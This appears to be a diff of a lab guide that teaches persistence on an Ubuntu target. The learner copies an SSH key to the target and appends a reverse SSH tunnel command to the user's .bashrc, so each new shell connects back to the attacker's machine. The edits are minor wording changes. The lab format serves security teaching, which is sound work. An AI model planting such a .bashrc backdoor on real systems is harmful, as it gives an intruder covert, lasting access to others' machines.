@@ -9,7 +9,7 @@ You'll set up an ingenious trap, one that will automatically establish an SSH co
 
 # Lab Requirements
 - Two Ubuntu servers (e.g. 22.04) that can reach each other via the network. Use the Ainstall.sh file for the attackers machine, and the Binstall.sh for the target system.
-- The IP addresses or fully qualified domain names of each system. This information will be necessary when attempting to connect.
+- The IP addresses or fully qualified domain names of each system. This information will be necessary when attempting to connect. I recommend that you use static IP addresses to make things easier during the lab.
 - A user account with permission to edit the targeted user's bashrc file on the target system
 
 # Environment Setup Notes
@@ -18,9 +18,9 @@ You'll set up an ingenious trap, one that will automatically establish an SSH co
 - Ensure that the attackers SSH server is running and properly configured 
 
 # Learner Instructions
-1. Select the machine representing the Attacker. Opening the terminal, enter the following command: **`ssh-keygen -t rsa`** . This command generates a public-private key pair which will be used to unlock the target machine. Note where the file will be saved. You will need to find this file again.
+1. Select the machine representing the Attacker. Opening the terminal, enter the following command: **`ssh-keygen -t rsa`** . This command generates an RSA public-private key pair which will be used to unlock the target machine.
 2. Using the following command, copy the public key to the target machine: **`ssh-copy-id <username>@<target_machine_IP>`**. 
-3. Keep in mind that you will need to replace **`<username>`** with the correct target username and **`<target_machine_IP>`** with IP address of the target.
+3. Keep in mind that you will need to replace **`<username>`** with the correct target username and **`<target_machine_IP>`** with IP address of the target. Do not enter a passphrase when asked to do so.
 4. On the target machine, open the user's bashrc file by executing the command: **`nano ~/.bashrc`**. This command will open the nano text editor and display the contents of the bashrc file, providing the opportunity to plant the reverse shell.
 5. Append the following line to the end of the file: **`ssh -f -N -R 2222:localhost:22 <username>@<attacker_machine_IP>`**. Replace **`<username>`** with the username of the user account on the attacker machine and **`<attacker_machine_IP>`** with the IP address of the attacker machine.
 6. Save and close the bashrc file by executing **`Ctrl + X`**, then **`Y`**, then **`Enter`**, saving the file.
